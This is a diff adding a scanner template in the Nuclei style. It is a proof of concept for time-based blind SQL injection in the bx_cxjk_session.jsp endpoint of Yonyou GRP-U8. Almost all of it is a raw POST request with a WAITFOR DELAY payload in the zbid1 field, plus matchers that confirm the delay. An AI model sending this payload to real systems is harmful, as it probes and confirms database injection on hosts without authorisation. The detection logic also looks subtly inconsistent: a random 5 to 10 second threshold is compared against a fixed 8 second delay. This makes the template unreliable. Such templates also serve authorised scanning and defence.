@@ -1,0 +1,37 @@
+id: poc-yaml-grp-u8-bx-cxjk-session-jsp-sqli
+info:
+  name: \u7528\u53CBGRP-U8 bx_cxjk_session.jsp SQL\u6CE8\u5165\u6F0F\u6D1E
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection
+  metadata:
+    finger: GRP-U8
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+
+http:
+  - raw:
+      - |
+        POST /u8qx/bx_cxjk_session.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        rowID=1&djbh1=123&cxje1=1&zbid1=1')WAITFOR+DELAY+'0:0:8'--+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{\"rows\":[],\"state\":\"1\"}"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
